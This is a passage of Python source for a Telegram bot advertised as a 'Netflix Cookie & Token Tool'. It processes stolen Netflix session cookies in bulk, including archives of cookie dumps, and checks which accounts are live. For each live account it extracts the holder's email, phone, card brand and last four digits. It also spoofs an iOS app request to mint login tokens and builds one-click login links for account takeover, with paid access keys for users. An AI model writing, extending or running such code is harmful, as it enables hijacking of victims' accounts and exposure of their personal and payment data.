            r'(?<!mac=)(v=3&ct=[^;\s]+(?:&[^;\s]+)*)',
        ]
        for pattern in raw_patterns:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        lines = text.split('\n')
        for line in lines:
            parts = line.split('\t')
            if len(parts) >= 7:
                name = parts[5].strip()
                value = parts[6].strip()
                if name == 'NetflixId':
                    return value
        return netflix_id

    def extract_all_cookies(self, text):
        cookies = {}
        for key in ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent']:
            match = re.search(rf'{key}=([^;\s]+)', text)
            if match:
                cookies[key] = match.group(1).strip('; ')
        if not cookies.get('NetflixId'):
            lines = text.split('\n')
            for line in lines:
                if line.startswith('#') or not line.strip():
                    continue
                parts = line.split('\t')
                if len(parts) >= 7:
                    name = parts[5].strip()
                    value = parts[6].strip()
                    if name in ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent']:
                        cookies[name] = value
        return cookies

    def build_cookie_string(self, cookie_dict):
        return '; '.join(f"{k}={v}" for k, v in cookie_dict.items())

    def _generate_ios_token(self, netflix_id_value):
        api_url = 'https://ios.prod.ftl.netflix.com/iosui/user/15.48'
        params = {
            "appVersion": "15.48.1",
            "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false"}',
            "device_type": "NFAPPL-02-",
            "esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
            "idiom": "phone",
            "iosVersion": "15.8.5",
            "isTablet": "false",
            "languages": "en-US",
            "locale": "en-US",
            "maxDeviceWidth": "375",
            "model": "saget",
            "modelType": "IPHONE8-1",
            "odpAware": "true",
            "path": '["account","token","default"]',
            "pathFormat": "graph",
            "pixelDensity": "2.0",
            "progressive": "false",
            "responseFormat": "json",
        }
        headers = {
            "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
            "x-netflix.request.attempt": "1",
            "x-netflix.client.idiom": "phone",
            "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
            "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
            "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
            "x-netflix.context.app-version": "15.48.1",
            "x-netflix.argo.translated": "true",
            "x-netflix.context.form-factor": "phone",
            "x-netflix.context.sdk-version": "2012.4",
            "x-netflix.client.appversion": "15.48.1",
            "x-netflix.context.max-device-width": "375",
            "x-netflix.context.ab-tests": "",
            "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
            "x-netflix.client.type": "argo",
            "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
            "x-netflix.context.locales": "en-US",
            "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
            "x-netflix.client.iosversion": "15.8.5",
            "accept-language": "en-US;q=1",
            "x-netflix.argo.abtests": "",
            "x-netflix.context.os-version": "15.8.5",
            "x-netflix.request.client.context": '{"appState":"foreground"}',
            "x-netflix.context.ui-flavor": "argo",
            "x-netflix.argo.nfnsm": "9",
            "x-netflix.context.pixel-density": "2.0",
            "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
            "x-netflix.request.client.timezoneid": "Asia/Dhaka",
            "Cookie": f"NetflixId={netflix_id_value}",
        }
        try:
            response = self.session.get(api_url, params=params, headers=headers, timeout=10)
            if response.status_code != 200:
                return None, f"iOS API HTTP {response.status_code}"
            data = response.json()
            if "value" in data and "account" in data["value"]:
                token_info = data["value"]["account"]["token"]["default"]
                token_value = token_info["token"]
                return token_value, None
            elif 'errorCode' in data:
                return None, f"iOS API: {data.get('errorCode', 'Unknown')}"
            return None, "iOS API: Unexpected response format"
        except Exception as e:
            return None, f"iOS API error: {str(e)}"

    def generate_token_sync(self, cookie_input):
        if isinstance(cookie_input, dict):
            cookie_dict = cookie_input
        else:
            cookie_dict = self.extract_all_cookies(str(cookie_input))

        if 'NetflixId' not in cookie_dict:
            netflix_id = self.extract_netflix_id(str(cookie_input)) if not isinstance(cookie_input, dict) else None
            if netflix_id:
                cookie_dict['NetflixId'] = netflix_id
            else:
                return {"success": False, "error": "Missing required cookie: NetflixId"}

        netflix_id_value = cookie_dict['NetflixId']

        try:
            token_value, ios_err = self._generate_ios_token(netflix_id_value)
            if not token_value:
                return {"success": False, "error": ios_err or "Token generation failed"}

            android_login_url = f"https://www.netflix.com/unsupported?nftoken={token_value}"
            pc_login_url = f"https://www.netflix.com/account?nftoken={token_value}"
            self.stats["tokens_generated"] += 1
            self.stats["last_generated"] = datetime.now()
            return {
                "success": True, "token": token_value,
                "android_login_url": android_login_url,
                "pc_login_url": pc_login_url,
                "login_url": pc_login_url,
            }
        except requests.exceptions.Timeout:
            self.stats["errors"] += 1
            return {"success": False, "error": "Request timeout"}
        except requests.exceptions.RequestException as e:
            self.stats["errors"] += 1
            return {"success": False, "error": f"Request failed: {str(e)}"}
        except json.JSONDecodeError as e:
            self.stats["errors"] += 1
            return {"success": False, "error": f"Failed to parse JSON: {str(e)}"}
        except Exception as e:
            self.stats["errors"] += 1
            return {"success": False, "error": f"Unexpected error: {str(e)}"}

    def humanize_time(self, td):
        seconds = td.total_seconds()
        if seconds < 60:
            return f"{int(seconds)} seconds"
        elif seconds < 3600:
            return f"{int(seconds // 60)} minutes"
        elif seconds < 86400:
            return f"{int(seconds // 3600)} hours"
        else:
            return f"{int(seconds // 86400)} days"

    def get_stats(self):
        return self.stats


checker = NetflixChecker()
token_gen = NetflixTokenGenerator()


def format_full_result(source_label, account_info, login_url, cookie_line, android_login_url=None, use_html=False):
    name = account_info.get('name', 'N/A')
    country = account_info.get('country', 'N/A')
    plan = account_info.get('plan', 'N/A')
    price = account_info.get('plan_price', 'N/A')
    member_since = account_info.get('member_since', 'N/A')
    next_billing = account_info.get('next_billing', 'N/A')
    payment_method = account_info.get('payment_method', 'N/A')
    card_brand_list = account_info.get('card_brand', ['Unknown'])
    card_brand_str = card_brand_list[0] if isinstance(card_brand_list, list) and card_brand_list else str(card_brand_list)
    last4 = account_info.get('last4', 'Unknown')
    phone = account_info.get('phone', 'N/A')
    phone_verified = account_info.get('phone_verified', 'Unknown')
    video_quality = account_info.get('video_quality', 'Unknown')
    max_streams = account_info.get('max_streams', 'Unknown')
    connected_profiles = account_info.get('connected_profiles', 'Unknown')
    email = account_info.get('email', 'N/A')
    extra_members = account_info.get('extra_members', 'Unknown')
    extra_member_slot = account_info.get('extra_member_slot_status', 'Unknown')
    email_verified = account_info.get('email_verified', 'Unknown')
    on_hold = account_info.get('on_hold', 'Unknown')
    membership_status = account_info.get('membership_status', 'Unknown')
    profiles = account_info.get('profiles', 'Unknown')

    country_code_raw = None
    for cc_code, cc_name in COUNTRY_MAPPING.items():
        if cc_name == country:
            country_code_raw = cc_code
            break
    country_display = f"{country} ({country_code_raw})" if country_code_raw else country

    phone_display = f"{phone} ({phone_verified})" if phone != "N/A" else "N/A"
    if "\u2022" in last4 or "****" in last4 or "..." in last4:
        card_display = f"{card_brand_str} {last4}"
    else:
        card_display = f"{card_brand_str} \u2022\u2022\u2022\u2022 {last4}"

    final_login = android_login_url or login_url

    now = datetime.now()
    generated_str = now.strftime("%Y-%m-%d %H:%M:%S")
    expires = now + timedelta(hours=1)
    expires_str = expires.strftime("%Y-%m-%d %H:%M:%S")

    if use_html:
        return (
            f"\U0001f31f <b>PREMIUM ACCOUNT</b> \U0001f31f\n\n"
            f"\U0001f464 <b>Account Details:</b>\n"
            f"\u2022 <b>Name:</b> {name}\n"
            f"\u2022 <b>Email:</b> {email}\n"
            f"\u2022 <b>Country:</b> {country_display}\n"
            f"\u2022 <b>Plan:</b> {plan}\n"
            f"\u2022 <b>Price:</b> {price}\n"
            f"\u2022 <b>Member Since:</b> {member_since}\n"
            f"\u2022 <b>Next Billing:</b> {next_billing}\n"
            f"\u2022 <b>Payment:</b> {payment_method}\n"
            f"\u2022 <b>Card:</b> {card_display}\n"
            f"\u2022 <b>Phone:</b> {phone_display}\n"
            f"\u2022 <b>Quality:</b> {video_quality}\n"
            f"\u2022 <b>Streams:</b> {max_streams}\n"
            f"\u2022 <b>Hold Status:</b> {on_hold}\n"
            f"\u2022 <b>Extra Member:</b> {extra_members}\n"
            f"\u2022 <b>Extra Member Slot:</b> {extra_member_slot}\n"
            f"\u2022 <b>Email Verified:</b> {email_verified}\n"
            f"\u2022 <b>Membership Status:</b> {membership_status}\n"
            f"\u2022 <b>Connected Profiles:</b> {connected_profiles}\n"
            f"\u2022 <b>Profiles:</b> {profiles}\n\n"
            f"\U0001f511 <b>Token Information:</b>\n"
            f"\u23f0 <b>Generated:</b> {generated_str}\n"
            f"\U0001f4c5 <b>Expires:</b> {expires_str}\n"
            f"\u23f3 <b>Remaining:</b> 0d 1h 0m 0s\n"
            f"\U0001f4f1 <b>Phone Login:</b> <a href=\"{final_login}\">Click Here</a>\n"
            f"\U0001f5a5\ufe0f <b>PC Login:</b> <a href=\"{login_url}\">Click Here</a>\n\n"
            f"\U0001f36a <b>Cookie:</b>\n<code>{cookie_line}</code>\n\n"
            f"\U0001f3af <b>Bot Owner:</b> @XD_HR"
        )

    return (
        f"\U0001f31f PREMIUM ACCOUNT \U0001f31f\n\n"
        f"\U0001f464 Account Details:\n"
        f"\u2022 Name: {name}\n"
        f"\u2022 Email: {email}\n"
        f"\u2022 Country: {country_display}\n"
        f"\u2022 Plan: {plan}\n"
        f"\u2022 Price: {price}\n"
        f"\u2022 Member Since: {member_since}\n"
        f"\u2022 Next Billing: {next_billing}\n"
        f"\u2022 Payment: {payment_method}\n"
        f"\u2022 Card: {card_display}\n"
        f"\u2022 Phone: {phone_display}\n"
        f"\u2022 Quality: {video_quality}\n"
        f"\u2022 Streams: {max_streams}\n"
        f"\u2022 Hold Status: {on_hold}\n"
        f"\u2022 Extra Member: {extra_members}\n"
        f"\u2022 Extra Member Slot: {extra_member_slot}\n"
        f"\u2022 Email Verified: {email_verified}\n"
        f"\u2022 Membership Status: {membership_status}\n"
        f"\u2022 Connected Profiles: {connected_profiles}\n"
        f"\u2022 Profiles: {profiles}\n\n"
        f"\U0001f511 Token Information:\n"
        f"\u23f0 Generated: {generated_str}\n"
        f"\U0001f4c5 Expires: {expires_str}\n"
        f"\u23f3 Remaining: 0d 1h 0m 0s\n"
        f"\U0001f4f1 Phone Login: {final_login}\n"
        f"\U0001f5a5\ufe0f PC Login: {login_url}\n\n"
        f"\U0001f36a Cookie: {cookie_line}\n\n"
        f"\U0001f3af Bot Owner: @XD_HR"
    )


def get_filtered_netflix_ids(text):
    filtered = []
    for line in text.splitlines():
        matches = re.findall(r'(?<!Secure)NetflixId\s*=\s*([^\|;\n]+)', line)
        for m in matches:
            filtered.append("NetflixId=" + m.strip())
    return filtered


def check_and_generate(cookie_line, source_label, use_html=False):
    try:
        cookies = checker.load_cookies(cookie_line)
        if not cookies:
            return None, "Invalid/empty cookie string"
        account_info = checker.check_account(cookies)
        token_gen.stats["checks_done"] += 1
        if account_info.get('status') != 'success':
            status = account_info.get('status', 'failure')
            msg = account_info.get('message', '')
            membership = account_info.get('membership_status', '')
            return None, f"Status: {status} | {membership} | {msg}"
        token_gen.stats["hits"] += 1
        login_url = "N/A"
        android_login_url = "N/A"
        logger.info(f"Token gen: using full cookie string ({len(cookie_line)} chars)")
        token_result = token_gen.generate_token_sync(cookie_line)
        logger.info(f"Token gen result: success={token_result.get('success')}, error={token_result.get('error', 'none')}")
        if token_result.get("success"):
            login_url = token_result.get("pc_login_url", token_result.get("login_url", "N/A"))
            android_login_url = token_result.get("android_login_url", login_url)
        formatted = format_full_result(source_label, account_info, login_url, cookie_line, android_login_url, use_html=use_html)
        return formatted, None
    except Exception as e:
        logger.error(f"check_and_generate error: {e}")
        token_gen.stats["errors"] += 1
        return None, f"Error: {str(e)[:100]}"


def parse_cookie_file_content(content):
    if not content or 'NetflixId' not in content and 'netflixid' not in content.lower() and 'v%3D3%26ct%3D' not in content and 'v=3&ct=' not in content:
        return None
    lines = content.strip().splitlines()
    if not lines:
        return None
    netscape_cookies = {}
    has_tabs = '\t' in content
    if has_tabs:
        for line in lines:
            line = line.strip()
            if not line or line[0] == '#' or line.startswith('//'):
                continue
            parts = line.split('\t')
            if len(parts) >= 7:
                name = parts[5].strip()
                value = parts[6].strip()
                if name and value:
                    netscape_cookies[name] = value
            elif len(parts) >= 2:
                name = parts[-2].strip()
                value = parts[-1].strip()
                if name in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'):
                    netscape_cookies[name] = value
        if 'NetflixId' in netscape_cookies:
            return "; ".join(f"{k}={v}" for k, v in netscape_cookies.items())
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if ('NetflixId=' in line or 'netflixid=' in line.lower() or
                'v%3D3%26ct%3D' in line or 'v=3&ct=' in line):
            if '\t' not in line:
                return line
    for line in lines:
        line = line.strip()
        if 'v%3D3%26ct%3D' in line or 'v=3&ct=' in line or 'SecureNetflixId' in line:
            return line
    return None


def human_size(num, suffix='B'):
    for unit in ['', 'Ki', 'Mi', 'Gi', 'Ti', 'Pi', 'Ei', 'Zi']:
        if abs(num) < 1024.0:
            return "%3.1f%s%s" % (num, unit, suffix)
        num /= 1024.0
    return "%.1f%s%s" % (num, 'Yi', suffix)


class InMemoryArchive:
    def __init__(self, file_data):
        self.file_data = file_data
        self.cookies = {}

    def read(self, name):
        return self.file_data.get(name, b'')

    def close(self):
        self.file_data.clear()
        self.cookies.clear()


class ExtractedArchive:
    def __init__(self, path):
        self.path = path

    def read(self, name):
        fpath = os.path.normpath(os.path.join(self.path, name))
        if not fpath.startswith(os.path.normpath(self.path)):
             raise ValueError("Path traversal attempt")
        with open(fpath, 'rb') as f:
            return f.read()

    def close(self):
        shutil.rmtree(self.path, ignore_errors=True)


def extract_archive_files(archive_bytes):
    try:
        import rarfile
        import shutil as _shutil
        unrar_path = _shutil.which("unrar") or "unrar"
        rarfile.UNRAR_TOOL = unrar_path
        rarfile.HACK_SIZE_LIMIT = 100 * 1024 * 1024
    except ImportError:
        rarfile = None
    try:
        import py7zr
    except ImportError:
        py7zr = None
    import tarfile

    skip_ext = {'.zip', '.rar', '.7z', '.tar', '.gz', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.ico', '.svg', '.mp4', '.mp3', '.wav', '.pdf', '.exe', '.dll', '.so', '.bin', '.dat', '.db', '.sqlite'}

    is_zip = False
    try:
        with zipfile.ZipFile(io.BytesIO(archive_bytes)) as zf_test:
            is_zip = True
    except:
        pass

    if is_zip:
        return _extract_zip_inmemory(archive_bytes, skip_ext)

    return _extract_to_disk(archive_bytes, rarfile, py7zr, tarfile, skip_ext)


def _extract_zip_inmemory(archive_bytes, skip_ext):
    extract_dir = os.path.join(DOWNLOAD_DIR, f"zip_{int(time.time())}_{random.randint(1000,9999)}")
    os.makedirs(extract_dir, exist_ok=True)
    try:
        start = time.time()
        cookies = {}
        txt_files = []

        zip_path = os.path.join(extract_dir, "source.zip")
        with open(zip_path, 'wb') as f:
            f.write(archive_bytes)

        zf = zipfile.ZipFile(zip_path)
        txt_names = []
        nested_zips = []
        non_txt_names = []

        for name in zf.namelist():
            if name.endswith('/'):
                continue
            basename = os.path.basename(name).lower()
            if basename.startswith('.') or basename.startswith('.__'):
                continue
            ext = os.path.splitext(basename)[1]
            if ext in skip_ext:
                continue
            if basename.endswith('.txt'):
                txt_names.append(name)
            elif name.lower().endswith('.zip'):
                nested_zips.append(name)
            else:
                non_txt_names.append(name)

        t_classify = time.time() - start
        logger.info(f"ZIP classify: {len(txt_names)} txt, {len(nested_zips)} nested zips, {len(non_txt_names)} other in {t_classify:.2f}s")

        extract_members = txt_names + nested_zips
        if not txt_names and non_txt_names:
            extract_members += non_txt_names[:500]

        t_extract = time.time()
        out_dir = os.path.join(extract_dir, "out")
        if extract_members:
            zf.extractall(out_dir, members=extract_members)
        zf.close()
        t_extract_done = time.time() - t_extract
        logger.info(f"ZIP extractall: {len(extract_members)} files to disk in {t_extract_done:.2f}s")

        os.remove(zip_path)

        t_parse = time.time()
        for name in txt_names:
            try:
                fpath = os.path.join(out_dir, name)
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                cookie_str = parse_cookie_file_content(content)
                if cookie_str:
                    cookies[name] = cookie_str
                    txt_files.append(name)
            except:
                pass

        for nz in nested_zips:
            try:
                nz_path = os.path.join(out_dir, nz)
                with zipfile.ZipFile(nz_path) as nzf:
                    for nname in nzf.namelist():
                        if nname.endswith('/'):
                            continue
                        nb = os.path.basename(nname).lower()
                        if nb.startswith('.') or not nb.endswith('.txt'):
                            continue
                        try:
                            content = nzf.read(nname).decode('utf-8', errors='ignore')
                            cookie_str = parse_cookie_file_content(content)
                            if cookie_str:
                                full_name = f"{nz}/{nname}"
                                cookies[full_name] = cookie_str
                                txt_files.append(full_name)
                        except:
                            pass
            except:
                pass

        if not txt_files and non_txt_names:
            for name in non_txt_names[:500]:
                try:
                    fpath = os.path.join(out_dir, name)
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    cookie_str = parse_cookie_file_content(content)
                    if cookie_str:
                        cookies[name] = cookie_str
                        txt_files.append(name)
                except:
                    pass

        elapsed = time.time() - start
        logger.info(f"ZIP disk extract+parse: {len(txt_files)} cookies from {len(txt_names)} txt files in {elapsed:.2f}s (classify={t_classify:.2f}s, extract={t_extract_done:.2f}s, parse={time.time()-t_parse:.2f}s)")

        if not txt_files:
            return None, [], None

        archive = InMemoryArchive({})
        archive.cookies = cookies
        return archive, txt_files, "inmemory"

    except Exception as e:
        logger.error(f"ZIP extraction failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return None, [], None
    finally:
        shutil.rmtree(extract_dir, ignore_errors=True)
        logger.info(f"ZIP cleanup: deleted {extract_dir}")


def _extract_to_disk(archive_bytes, rarfile, py7zr, tarfile, skip_ext):
    extract_id = f"{int(time.time())}_{random.randint(1000, 9999)}"
    extract_dir = os.path.join(DOWNLOAD_DIR, f"extract_{extract_id}")
    os.makedirs(extract_dir, exist_ok=True)

    def try_extract(data, target_dir):
        if rarfile:
            temp_rar = os.path.join(DOWNLOAD_DIR, f"temp_{extract_id}.rar")
            try:
                with open(temp_rar, 'wb') as f:
                    f.write(data)
                with rarfile.RarFile(temp_rar) as r:
                    r.extractall(target_dir)
                    logger.info("RAR extraction success")
                    return True
            except Exception as e:
                logger.debug(f"RAR extraction failed: {e}")
            finally:
                if os.path.exists(temp_rar):
                    try: os.remove(temp_rar)
                    except: pass

        if py7zr:
            try:
                with py7zr.SevenZipFile(io.BytesIO(data), mode='r') as z:
                    z.extractall(path=target_dir)
                    logger.info("7Z extraction success")
                    return True
            except Exception as e:
                logger.debug(f"7Z extraction failed: {e}")

        try:
            with tarfile.open(fileobj=io.BytesIO(data)) as t:
                t.extractall(target_dir)
                logger.info("TAR extraction success")
                return True
        except Exception as e:
            logger.debug(f"TAR extraction failed: {e}")

        return False

    try:
        if not try_extract(archive_bytes, extract_dir):
            shutil.rmtree(extract_dir, ignore_errors=True)
            return None, [], None

        txt_files = []
        non_txt_files = []
        for root, dirs, files in os.walk(extract_dir):
            for fname in files:
                if fname.startswith('.'):
                    continue
                fl = fname.lower()
                ext = os.path.splitext(fl)[1]
                if ext in skip_ext:
                    continue
                fpath = os.path.join(root, fname)
                if fl.endswith('.txt'):
                    txt_files.append(os.path.relpath(fpath, extract_dir))
                else:
                    non_txt_files.append(fpath)

        if not txt_files and non_txt_files:
            for fpath in non_txt_files[:500]:
                try:
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as cf:
                        sample = cf.read(512)
                        if 'NetflixId=' in sample or 'netflixid=' in sample.lower() or 'v%3D3%26ct%3D' in sample:
                            new_path = fpath + '.txt'
                            os.rename(fpath, new_path)
                            txt_files.append(os.path.relpath(new_path, extract_dir))
                except:
                    pass

        if not txt_files:
            shutil.rmtree(extract_dir, ignore_errors=True)
            return None, [], None

        return ExtractedArchive(extract_dir), txt_files, "folder"

    except Exception as e:
        logger.error(f"Archive extraction failed: {e}")
        shutil.rmtree(extract_dir, ignore_errors=True)
        return None, [], None


async def download_file_to_disk(tg_file, filename):
    local_path = os.path.join(DOWNLOAD_DIR, f"{int(time.time())}_{random.randint(1000, 9999)}_{filename}")
    await tg_file.download_to_drive(local_path)
    return local_path


def cleanup_file(path):
    if path and os.path.exists(path):
        try:
            if os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
                logger.info(f"Cleaned up directory: {path}")
            else:
                os.remove(path)
                logger.info(f"Cleaned up file: {path}")
        except Exception as e:
            logger.error(f"Failed to cleanup file {path}: {e}")


def cleanup_all_temp():
    for d in [DOWNLOAD_DIR, RESULTS_DIR]:
        if os.path.exists(d):
            for item in os.listdir(d):
                item_path = os.path.join(d, item)
                try:
                    if os.path.isdir(item_path):
                        shutil.rmtree(item_path, ignore_errors=True)
                    else:
                        os.remove(item_path)
                except Exception:
                    pass
            logger.info(f"Cleaned up all files in {d}")


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    has_access = is_authorized(user.id)

    if has_access:
        access_info = get_access_info(user.id)
        batch_info = "Unlimited"
    else:
        access_info = "Free"
        remaining = get_batch_remaining(user.id)
        batch_info = f"{remaining}/{FREE_DAILY_BATCH_LIMIT} batches left today"

    welcome = (
        "<b>\U0001f3ac NETFLIX PREMIUM BOT v5.0</b>\n"
        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        "<i>Ultimate Netflix Cookie & Token Tool</i>\n\n"
        "<b>\U0001f451 Bot Owner:</b> @XD_HR\n"
        f"<b>\U0001f3ab Your Access:</b> <code>{access_info}</code>\n"
        f"<b>\U0001f4e6 Batch Limit:</b> <code>{batch_info}</code>\n"
        f"<b>\U0001f680 Performance:</b> <code>{WORKER_COUNT} Workers</code>\n\n"
        "<b>\U0001f6e0 AVAILABLE COMMANDS</b>\n"
        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        "\U0001f539 <b>/chk</b> - Check Cookie + Token\n"
        "\U0001f539 <b>/batch</b> - Mass Cookie Process\n"
        "\U0001f539 <b>/extract</b> - Extract NetflixId\n"
        "\U0001f539 <b>/gen</b> - Quick Token Gen\n"
        "\U0001f539 <b>/stats</b> - System Stats\n"
        "\U0001f539 <b>/redeem</b> - Activate Key\n"
    )

    lock_status = "\U0001f512 LOCKED" if bot_locked else "\U0001f513 UNLOCKED"

    if str(user.id) == OWNER_USER_ID:
        welcome += (
            "\n<b>\U0001f6e1 OWNER CONTROLS</b>\n"
            "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
            f"\U0001f538 <b>Bot Status:</b> <code>{lock_status}</code>\n"
            "\U0001f538 <b>/lock all</b> - Lock Free Access\n"
            "\U0001f538 <b>/unlock all</b> - Unlock Free Access\n"
            "\U0001f538 <b>/stop_batch</b> - Stop Any Batch\n"
            "\U0001f538 <b>/mercy</b> - Grant Access\n"
            "\U0001f538 <b>/remove</b> - Revoke Access\n"
            "\U0001f538 <b>/genkey</b> - Generate Keys\n"
            "\U0001f538 <b>/preview</b> - View Active Batches\n"
        )

    welcome += (
        "\n<b>\u2699\ufe0f CONTROL CENTER</b>\n"
        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        "\U0001f538 <b>/workers</b> - Speed Control\n"
        "\U0001f538 <b>/stop</b> - Emergency Stop\n"
        "\U0001f538 <b>/cancel</b> - Abort Batch\n\n"
        "<b>\U0001f4e6 SUPPORTED DATA</b>\n"
        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        "\u2705 <code>Full Cookie Strings</code>\n"
        "\u2705 <code>NetflixId Values</code>\n"
        "\u2705 <code>Netscape/JSON Files</code>\n"
        "\u2705 <code>Compressed Archives (.zip, .rar)</code>\n\n"
        "<b>\u2728 Powered by @XD_HR</b>"
    )
    await update.message.reply_text(welcome, parse_mode=ParseMode.HTML)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "<b>Help - Netflix Bot</b>\n\n"
        "<b>\U0001f451 Bot Owner: @XD_HR</b>\n\n"
        "<b>Commands:</b>\n"
        "\u2022 /chk - Check cookie &amp; extract full info + token\n"
        "\u2022 /extract - Extract NetflixId cookies from raw dump\n"
        "\u2022 /gen - Generate token only from cookie\n"
        "\u2022 /batch - Process .txt file with multiple cookies\n"
        "\u2022 /stop - Stop batch and save valid results\n"
        "\u2022 /cancel - Cancel batch without saving\n"
        "\u2022 /stats - Show bot statistics\n"
        "\u2022 /workers &lt;num&gt; - Set parallel workers (1-100)\n"
        "\u2022 /redeem &lt;key&gt; - Redeem access key\n"
    )

    if str(update.effective_user.id) == OWNER_USER_ID:
        help_text += (
            "\n<b>Owner Commands:</b>\n"
            "\u2022 /mercy &lt;user_id&gt; - Grant permanent access\n"
            "\u2022 /remove &lt;user_id&gt; - Revoke access\n"
            "\u2022 /genkey &lt;duration&gt; [count] - Generate access keys\n"
            "\u2022 /stop_batch &lt;id&gt; - Stop a user's batch\n"
            "\u2022 /preview - View active batches\n"
            "\u2022 Durations: 1h, 6h, 12h, 1d, 3d, 7d, 14d, 1m, 3m, 6m, 1y\n"
        )

    help_text += (
        "\n<b>Output includes:</b>\n"
        "Name, Country, Plan, Price, Member Since, Next Billing,\n"
        "Payment Method, Card Brand, Last 4 Digits, Phone,\n"
        "Phone Verified, Video Quality, Max Streams,\n"
        "Connected Profiles, Email, Extra Member Slot,\n"
        "PC Login URL, Android Login URL, Cookie"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)


async def mercy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if str(user.id) != OWNER_USER_ID:
        await update.message.reply_text("\u274c This command is only available for the bot owner.", parse_mode=ParseMode.HTML)
        return
    args = context.args or []
    if not args:
        perm_list = []
        for uid in authorized_users:
            perm_list.append(f"\u2022 {uid} - Permanent")
        timed_list = []
        for uid, info in user_access.items():
            exp = info.get("expires", 0)
            if exp == 0:
                timed_list.append(f"\u2022 {uid} - Permanent (Key)")
            elif time.time() < exp:
                remaining = get_access_info(uid)
                timed_list.append(f"\u2022 {uid} - {remaining}")
            else:
                timed_list.append(f"\u2022 {uid} - Expired")
        all_users = "\n".join(perm_list + timed_list) if (perm_list or timed_list) else "None"
        total = len(authorized_users) + len([u for u in user_access if time.time() < user_access[u].get("expires", 1)])
        await update.message.reply_text(
            f"<b>\U0001f465 Authorized Users ({total})</b>\n\n{all_users}\n\n"
            f"<b>Usage:</b>\n"
            f"/mercy &lt;user_id&gt; - Grant permanent access\n"
            f"/remove &lt;user_id&gt; - Revoke access\n"
            f"/genkey &lt;duration&gt; - Generate access key\n"
            f"Durations: 1h, 6h, 12h, 1d, 3d, 7d, 14d, 1m, 3m, 6m, 1y",
            parse_mode=ParseMode.HTML
        )
        return
    target = args[0]
    authorized_users.add(target)
    save_authorized_users()
    await update.message.reply_text(f"\u2705 Permanent access granted to user: {target}", parse_mode=ParseMode.HTML)
    try:
        await context.bot.send_message(int(target), "\u2705 You have been granted permanent access to the Netflix bot by @XD_HR\nSend /start to begin.", parse_mode=ParseMode.HTML)
    except:
        pass


async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if str(user.id) != OWNER_USER_ID:
        await update.message.reply_text("\u274c This command is only available for the bot owner.", parse_mode=ParseMode.HTML)
        return
    args = context.args or []
    if not args:
        await update.message.reply_text("<b>Usage:</b> /remove &lt;user_id&gt;", parse_mode=ParseMode.HTML)
        return
    target = args[0]
    removed = False
    if target in authorized_users and target != OWNER_USER_ID:
        authorized_users.remove(target)
        save_authorized_users()
        removed = True
    if target in user_access:
        del user_access[target]
        save_user_access()
        removed = True
    if removed:
        await update.message.reply_text(f"\u2705 Access revoked for user: {target}", parse_mode=ParseMode.HTML)
        try:
            await context.bot.send_message(int(target), "\u274c Your access to the Netflix bot has been revoked by @XD_HR", parse_mode=ParseMode.HTML)
        except:
            pass
    else:
        await update.message.reply_text("\u274c User not found or cannot remove owner.", parse_mode=ParseMode.HTML)


async def lock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_locked
    user = update.effective_user
    if str(user.id) != OWNER_USER_ID:
        await update.message.reply_text("\u274c This command is only available for the bot owner.", parse_mode=ParseMode.HTML)
        return
    args = context.args or []
    if not args or args[0].lower() != "all":
